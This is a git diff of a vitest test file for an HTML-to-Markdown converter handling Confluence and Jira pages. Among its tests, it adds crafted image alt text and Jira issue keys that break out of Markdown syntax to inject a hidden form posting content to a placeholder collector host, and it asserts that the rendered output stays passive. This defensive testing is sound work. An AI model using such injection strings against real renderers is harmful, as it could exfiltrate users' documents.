@@ -1,11 +1,16 @@
+import { marked } from "marked";
 import { describe, expect, it, vi } from "vitest";
 
-import { buildTurndown, htmlToMarkdown } from "../../src/lib/html-to-md";
+import { buildTurndown, htmlToMarkdown, htmlToMarkdownWithLayout } from "../../src/lib/html-to-md";
 import { readFixtureText } from "../fixtures/fixture-loader";
 
 function normalizeWhitespace(markdown: string): string {
   return markdown.replace(/\r\n/g, "\n").trim();
 }
+
+const hostileImageAlt =
+  "x](https://assets.example.test/leak.png) <form action='https://collector.example.test/ingest' " +
+  "method='post'><button>Copy Markdown</button><textarea hidden name='content'>";
 
 describe("htmlToMarkdown", () => {
   it("converts headings, paragraphs, lists, code blocks, bold and italic text", () => {
@@ -54,33 +59,111 @@ describe("htmlToMarkdown", () => {
     expect(markdown).toContain("```java\nclass Demo {}\n```");
   });
 
-  it("converts Jira wiki links and bold markup to Markdown", () => {
-    const markdown = htmlToMarkdown(`
-      <p>[KIP-866|https://cwiki.apache.org/confluence/display/KAFKA/KIP-866] {*}Kafka v3.5.1{*}</p>
-    `);
-
-    expect(markdown).toContain(
-      "[KIP-866](https://cwiki.apache.org/confluence/display/KAFKA/KIP-866)",
+  it("encodes hostile image alt text so rendered output stays passive", () => {
+    const markdown = htmlToMarkdown(
+      `<p><img src="https://wiki.example/a.png" alt="${hostileImageAlt}"></p>`,
     );
-    expect(markdown).toContain("**Kafka v3.5.1**");
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
+
+    expect(rendered.querySelectorAll("form, button, textarea")).toHaveLength(0);
+    expect(rendered.querySelector("img")?.getAttribute("alt")).toBe(hostileImageAlt);
+    expect(rendered.querySelector("img")?.getAttribute("src")).toBe("https://wiki.example/a.png");
   });
 
-  it("converts Jira wiki code macros to fenced code", () => {
+  it("encodes hostile gallery image alt text so rendered output stays passive", () => {
+    const markdown = htmlToMarkdown(
+      `<ac:structured-macro ac:name="gallery">` +
+        `<img src="lorem.png" alt="${hostileImageAlt}">` +
+        `</ac:structured-macro>`,
+    );
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
+
+    expect(rendered.querySelectorAll("form, button, textarea")).toHaveLength(0);
+    expect(rendered.querySelector("img")?.getAttribute("alt")).toBe(hostileImageAlt);
+    expect(rendered.querySelector("img")?.getAttribute("src")).toBe("lorem.png");
+  });
+
+  it("encodes link destinations containing spaces so authored links still resolve", () => {
+    const markdown = htmlToMarkdown(
+      `<p><a href="https://wiki.example/attach/lorem image.png">Spacey</a></p>`,
+    );
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
+
+    expect(rendered.querySelector("a")).not.toBeNull();
+    expect(rendered.querySelector("a")?.getAttribute("href")).toBe(
+      "https://wiki.example/attach/lorem%20image.png",
+    );
+    expect(rendered.querySelector("a")?.textContent).toBe("Spacey");
+  });
+
+  it("encodes hostile Jira issue keys used as link labels", () => {
+    const markdown = htmlToMarkdown(
+      `<span class="jira-issue" data-jira-key="LOR-1](https://assets.example.test/x) ` +
+        `<form action='https://collector.example.test/i'><button>b</button>">` +
+        `<a class="jira-issue-key" href="https://jira.example/browse/LOR-1">LOR-1</a></span>`,
+    );
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
+
+    expect(rendered.querySelectorAll("form, button")).toHaveLength(0);
+    expect(rendered.querySelector("a")?.getAttribute("href")).toBe(
+      "https://jira.example/browse/LOR-1",
+    );
+    expect(rendered.querySelector("a")?.textContent).toContain("LOR-1");
+  });
+
+  it("keeps authored wiki-looking text literal without discarding real HTML formatting", async () => {
+    const html = await readFixtureText("export/jira-markup.html");
+    const markdown = htmlToMarkdown(html);
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
+    const paragraphs = rendered.querySelectorAll("p");
+
+    expect(paragraphs[0]?.textContent).toBe(
+      "Lorem [LOR-12|https://jira.example/browse/LOR-12] and {*}ipsum{*} remain literal rendered text.",
+    );
+    expect(paragraphs[1]?.textContent).toBe("{code:sql}SELECT lorem FROM ipsum;{code}");
+    expect(rendered.querySelector("a")).toBeNull();
+    expect(rendered.querySelector("pre")).toBeNull();
+    expect(rendered.querySelectorAll("strong")).toHaveLength(1);
+    expect(rendered.querySelector("strong")?.textContent).toBe("dolor");
+  });
+
+  it("keeps wiki-looking code macros literal in rendered HTML", () => {
     const markdown = htmlToMarkdown("<p>{code:sql}select 1;{code}</p>");
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
 
-    expect(markdown).toContain("```sql\nselect 1;\n```");
+    expect(rendered.querySelector("p")?.textContent).toBe("{code:sql}select 1;{code}");
+    expect(rendered.querySelector("pre")).toBeNull();
   });
 
-  it("drops attachments macro UI noise", () => {
+  it("omits attachment controls without removing surrounding page content", () => {
     const markdown = htmlToMarkdown(`
+      <p>Lorem before</p>
       <div class="conf-macro" data-macro-name="attachments">
-        <table><tr><th>Файл</th><th>Изменено</th></tr></table>
-        <p>Файлов еще нет.</p>
-        <p>Загрузить файл <img src="/wiki/images/icons/wait.gif"></p>
+        <table><tr><th>Lorem chrome</th></tr><tr><td>Ipsum chrome</td></tr></table>
+        <p>Lorem attachment control</p>
       </div>
+      <p>Lorem after</p>
     `);
 
-    expect(markdown).toBe("");
+    expect(markdown).toBe("Lorem before\n\nLorem after");
   });
 
   it("returns an empty string for empty input", () => {
@@ -90,7 +173,7 @@ describe("htmlToMarkdown", () => {
   it("strips Confluence noise before conversion", () => {
     const markdown = htmlToMarkdown(`
       <p>&nbsp;</p>
-      <p>{"enableNumbering":true}</p>
+      <p class="enh-settings hidden">{"enableNumbering":true}</p>
       <p class="auto-cursor-target"></p>
       <div class="auto-cursor-target">   </div>
       <div class="toc-macro"><a href="#contents">Contents</a></div>
@@ -186,17 +269,44 @@ describe("htmlToMarkdown", () => {
     expect(linkRewriter).toHaveBeenCalledWith("page.html", "Page");
   });
 
+  it("renders matching ordinary and table links before applying the fallback rewriter", () => {
+    const linkRenderer = vi.fn((href: string, text: string): string | undefined =>
+      href === "diagram" ? `![${text}](attachments/linked/plantuml/diagram.png)` : undefined,
+    );
+    const linkRewriter = vi.fn((href: string): string => `/rewritten/${href}`);
+
+    const markdown = htmlToMarkdown(
+      `
+        <p><a href="diagram">Architecture</a> <a href="page">Page</a></p>
+        <table>
+          <tr><th>Type</th><th>Asset</th></tr>
+          <tr><td>Diagram</td><td><a href="diagram">Sequence</a></td></tr>
+        </table>
+      `,
+      { linkRenderer, linkRewriter },
+    );
+
+    expect(markdown).toContain(
+      "![Architecture](attachments/linked/plantuml/diagram.png) [Page](/rewritten/page)",
+    );
+    expect(markdown).toContain(
+      "| Diagram | ![Sequence](attachments/linked/plantuml/diagram.png) |",
+    );
+    expect(linkRewriter).toHaveBeenCalledWith("page", "Page");
+    expect(linkRewriter).not.toHaveBeenCalledWith("diagram", expect.any(String));
+  });
+
   it("converts tables with thead to GFM tables", () => {
     const markdown = htmlToMarkdown(`
       <table>
-        <thead><tr><th>Name</th><th>Type</th></tr></thead>
-        <tbody><tr><td>items</td><td>MenuItem[]</td></tr></tbody>
+        <thead><tr><th>Lorem key</th><th>Lorem type</th></tr></thead>
+        <tbody><tr><td>ipsum</td><td>LoremItem[]</td></tr></tbody>
       </table>
     `);
 
-    expect(markdown).toContain("| Name | Type |");
+    expect(markdown).toContain("| Lorem key | Lorem type |");
     expect(markdown).toContain("| --- | --- |");
-    expect(markdown).toContain("| items | MenuItem\\[\\] |");
+    expect(markdown).toContain("| ipsum | LoremItem\\[\\] |");
   });
 
   it("uses the first th row as the GFM table header", () => {
@@ -223,17 +333,26 @@ describe("htmlToMarkdown", () => {
     expect(markdown).toContain("| A1 | B1 |");
   });
 
-  it("adds a synthetic header for key-value tables", () => {
+  it("keeps key-value table entries as body rows beneath a generated header", () => {
     const markdown = htmlToMarkdown(`
       <table>
-        <tr><th>Name</th><td>Menu</td></tr>
-        <tr><th>Mode</th><td>Vertical</td></tr>
+        <tr><th>Lorem key</th><td>ipsum</td></tr>
+        <tr><th>Lorem value</th><td>dolor</td></tr>
       </table>
     `);
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
+    const rows = Array.from(rendered.querySelectorAll("tbody tr"), (row) =>
+      Array.from(row.querySelectorAll("td"), (cell) => cell.textContent),
+    );
 
-    expect(markdown).toContain("| Поле | Значение |");
-    expect(markdown).toContain("| Name | Menu |");
-    expect(markdown).toContain("| Mode | Vertical |");
+    expect(rendered.querySelectorAll("thead th")).toHaveLength(2);
+    expect(rows).toEqual([
+      ["Lorem key", "ipsum"],
+      ["Lorem value", "dolor"],
+    ]);
   });
 
   it("duplicates cells for colspan and rowspan", () => {
@@ -306,68 +425,57 @@ describe("buildTurndown", () => {
 });
 
 describe("jira issue macro", () => {
-  it("converts open jira issue to linked markdown with summary and status", () => {
+  it("converts an unresolved issue to a link with summary and status", () => {
     const md = htmlToMarkdown(`
-      <span class="jira-issue" data-jira-key="KAFKA-15501">
-        <a href="https://issues.apache.org/jira/browse/KAFKA-15501" class="jira-issue-key">
-          <img class="icon" src="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=10318&amp;avatarType=issuetype">KAFKA-15501
-        </a>
-        -
-        <span class="summary">Create step navigation</span>
-        <span class="aui-lozenge aui-lozenge-subtle aui-lozenge-current jira-macro-single-issue-export-pdf">Review</span>
+      <span class="jira-issue" data-jira-key="LOR-12">
+        <a href="https://jira.example/browse/LOR-12" class="jira-issue-key">LOR-12</a>
+        <span class="summary">Lorem issue</span>
+        <span class="aui-lozenge">LOREM READY</span>
       </span>
     `);
-    expect(md).toContain("[KAFKA-15501](https://issues.apache.org/jira/browse/KAFKA-15501)");
-    expect(md).toContain("- Create step navigation");
-    expect(md).toContain("[Review]");
+    expect(md).toContain("[LOR-12](https://jira.example/browse/LOR-12)");
+    expect(md).toContain("- Lorem issue");
+    expect(md).toContain("[LOREM READY]");
     expect(md).not.toContain("~~");
   });
 
-  it("converts resolved jira issue with strikethrough", () => {
+  it("marks the whole resolved issue reference with strikethrough", () => {
     const md = htmlToMarkdown(`
-      <span class="jira-issue resolved" data-jira-key="KAFKA-15502">
-        <a href="https://issues.apache.org/jira/browse/KAFKA-15502" class="jira-issue-key">KAFKA-15502</a>
-        -
-        <span class="summary">Implement UI</span>
-        <span class="aui-lozenge aui-lozenge-success jira-macro-single-issue-export-pdf">Done</span>
+      <span class="jira-issue resolved" data-jira-key="LOR-13">
+        <a href="https://jira.example/browse/LOR-13" class="jira-issue-key">LOR-13</a>
+        <span class="summary">Ipsum issue</span>
+        <span class="aui-lozenge">LOREM COMPLETE</span>
       </span>
     `);
-    expect(md).toContain("~~");
-    expect(md).toContain("[KAFKA-15502]");
-    expect(md).toContain("- Implement UI");
-    expect(md).toContain("[Done]");
+    expect(md).toContain(
+      "~~[LOR-13](https://jira.example/browse/LOR-13) - Ipsum issue [LOREM COMPLETE]~~",
+    );
   });
 
-  it("handles jira issue without summary", () => {
+  it("keeps an issue link without inventing an absent summary or status", () => {
     const md = htmlToMarkdown(`
-      <span class="jira-issue" data-jira-key="KAFKA-100">
-        <a href="https://issues.apache.org/jira/browse/KAFKA-100" class="jira-issue-key">KAFKA-100</a>
+      <span class="jira-issue" data-jira-key="LOR-12">
+        <a href="https://jira.example/browse/LOR-12" class="jira-issue-key">LOR-12</a>
       </span>
     `);
-    expect(md).toContain("[KAFKA-100]");
-    expect(md).toContain("https://issues.apache.org/jira/browse/KAFKA-100");
+    expect(md).toBe("[LOR-12](https://jira.example/browse/LOR-12)");
   });
 });
 
 describe("aui lozenge badge", () => {
   it("converts standalone lozenge to bracketed text", () => {
-    const md = htmlToMarkdown('<span class="aui-lozenge aui-lozenge-subtle">In Progress</span>');
-    expect(md).toContain("[In Progress]");
-  });
-
-  it("converts success lozenge", () => {
-    const md = htmlToMarkdown('<span class="aui-lozenge aui-lozenge-success">Done</span>');
-    expect(md).toContain("[Done]");
+    const md = htmlToMarkdown('<span class="aui-lozenge">LOREM READY</span>');
+    expect(md).toContain("[LOREM READY]");
   });
 
   it("does not double-render lozenge inside jira-issue", () => {
     const md = htmlToMarkdown(`
-      <span class="jira-issue" data-jira-key="KEY-1">
-        <a href="https://jira.com/browse/KEY-1" class="jira-issue-key">KEY-1</a>
-        <span class="aui-lozenge">Open</span>
+      <span class="jira-issue" data-jira-key="LOR-12">
+        <a href="https://jira.example/browse/LOR-12" class="jira-issue-key">LOR-12</a>
+        <span class="aui-lozenge">LOREM READY</span>
       </span>
     `);
-    const lozengeCount = (md.match(/\[Open\]/g) || []).length;
+    const lozengeCount = (md.match(/\[LOREM READY\]/g) || []).length;
     expect(lozengeCount).toBe(1);
   });
 });
@@ -509,59 +617,107 @@ describe("confluence task list", () => {
 });
 
 describe("confluence user mention", () => {
-  it("converts user link to @username", () => {
+  it("converts an authored user link to a Markdown mention", () => {
     const md = htmlToMarkdown(
-      '<a class="confluence-userlink url fn" data-username="john" href="/display/~john">John Doe</a>',
+      '<a class="confluence-userlink" data-username="lorem" href="/display/~lorem">Lorem ipsum</a>',
     );
-    expect(md).toContain("@john");
+    expect(md).toContain("@lorem");
   });
 
-  it("converts span userlink to @username", () => {
+  it("converts an authored span mention without a profile link", () => {
     const md = htmlToMarkdown(
-      '<span class="confluence-userlink" data-username="jane">@jane</span>',
+      '<span class="confluence-userlink" data-username="ipsum">@ipsum</span>',
     );
-    expect(md).toContain("@jane");
+    expect(md).toContain("@ipsum");
   });
 });
 
-describe("unknown macro fallback", () => {
-  it("renders unknown macro as placeholder with name", () => {
-    const md = htmlToMarkdown(`
-      <div class="conf-macro output-inline" data-hasbody="false" data-macro-name="pagetree">
-        <div class="plugin_pagetree">Tree content</div>
+describe("Confluence page layouts", () => {
+  const view = `
+    <div class="contentLayout2">
+      <div class="columnLayout two-equal" data-layout="two-equal">
+        <div class="cell"><div class="innerCell"><h2>Left</h2><p>Alpha</p></div></div>
+        <div class="cell"><div class="innerCell"><p><a href="diagram">Diagram</a></p></div></div>
       </div>
-    `);
-    expect(md).toContain("[macro:pagetree]");
+      <div class="columnLayout single" data-layout="single">
+        <div class="cell"><div class="innerCell"><h2>Bottom</h2></div></div>
+      </div>
+    </div>
+  `;
+  const storage = `
+    <ac:layout>
+      <ac:layout-section ac:type="two_equal">
+        <ac:layout-cell><h2>Left</h2><p>Alpha</p></ac:layout-cell>
+        <ac:layout-cell><p>Diagram</p></ac:layout-cell>
+      </ac:layout-section>
+      <ac:layout-section ac:type="single">
+        <ac:layout-cell><h2>Bottom</h2></ac:layout-cell>
+      </ac:layout-section>
+    </ac:layout>
+  `;
+
+  it("preserves sections and applies ordinary link rendering inside cells", () => {
+    const result = htmlToMarkdownWithLayout(view, {
+      storageHtml: storage,
+      linkRenderer: (href, text) => (href === "diagram" ? `![${text}](diagram.png)` : undefined),
+    });
+
+    expect(result.layout).toEqual({ status: "preserved", sections: 2 });
+    expect(result.markdown).toContain('<!-- confx:section:start type="two_equal" -->');
+    expect(result.markdown).toContain("## Left");
+    expect(result.markdown).toContain("![Diagram](diagram.png)");
   });
 
-  it("renders unknown macro with body in HTML comment", () => {
-    const md = htmlToMarkdown(`
-      <div class="conf-macro output-block" data-hasbody="true" data-macro-name="custom-widget">
-        <p>Widget content here</p>
-      </div>
-    `);
-    expect(md).toContain("[macro:custom-widget]");
+  it("flattens content and reports a mismatch without reversible markers", () => {
+    const result = htmlToMarkdownWithLayout(view, {
+      storageHtml: storage.replace('ac:type="two_equal"', 'ac:type="single"'),
+    });
+
+    expect(result.layout).toEqual({ status: "flattened", sections: 2 });
+    expect(result.markdown).toContain("## Left");
+    expect(result.markdown).not.toContain("confx:layout:start");
+  });
+
+  it("keeps ordinary pages unchanged", () => {
+    const result = htmlToMarkdownWithLayout("<h2>Plain</h2>", {
+      storageHtml: "<h2>Plain</h2>",
+    });
+
+    expect(result).toEqual({
+      markdown: "## Plain",
+      layout: { status: "none", sections: 0 },
+    });
   });
 });
 
 describe("htmlToMarkdown integration", () => {
-  it("converts the Confluence page fixture with expected custom output", async () => {
+  it("preserves authored tables, macros, code and resources while excluding page chrome", async () => {
     const html = await readFixtureText("confluence-page.html");
+    const markdown = normalizeWhitespace(
+      htmlToMarkdown(html, { dropSelectors: ["#breadcrumb-section", ".page-metadata"] }),
+    );
+    const rendered = new DOMParser().parseFromString(
+      marked.parse(markdown, { async: false }),
+      "text/html",
+    );
 
-    const markdown = normalizeWhitespace(htmlToMarkdown(html));
-
-    expect(markdown).toContain("# Other blocks Page");
-    expect(markdown).toContain("lorem lorem");
-    expect(markdown).toContain("Some content 1");
-    expect(markdown).toContain("Some content 2");
-    expect(markdown).toContain("Some status");
-    expect(markdown).toContain("# Выбор макроса");
-    expect(markdown).toContain("#### Excel");
-    expect(markdown).toContain("JSM Incident Timeline");
-    expect(markdown).toContain("![");
-    expect(markdown).not.toContain("enableNumbering");
-    expect(markdown).not.toContain("toc-macro");
-    expect(markdown).not.toContain("auto-cursor-target");
-    expect(markdown).not.toContain("confluence-anchor-link");
+    expect(rendered.querySelectorAll("h1")).toHaveLength(1);
+    expect(rendered.querySelector("blockquote strong")?.textContent).toBe("NOTE");
+    expect(rendered.querySelector("details summary")?.textContent).toBe("Lorem expansion");
+    expect(markdown).toContain("Lorem expanded *details*.");
+    expect(rendered.querySelectorAll("table thead th")).toHaveLength(2);
+    expect(rendered.querySelectorAll("table tbody tr")).toHaveLength(2);
+    expect(rendered.querySelector("pre code.language-js")?.textContent).toBe(
+      'const lorem = "<Lorem>";\n  lorem.trim();\n',
+    );
+    expect(rendered.querySelector("img")?.getAttribute("src")).toBe(
+      "/download/attachments/1700/lorem.png",
+    );
+    expect(markdown).not.toContain("Lorem chrome");
+    expect(markdown).not.toContain("Lorem attachment chrome");
+    expect(markdown).not.toContain("Lorem attachment control");
+    expect(markdown).not.toContain("Lorem contents");
+    expect(markdown).not.toContain('{"lorem":true}');
+    expect(markdown).not.toContain("¶");
   });
 });
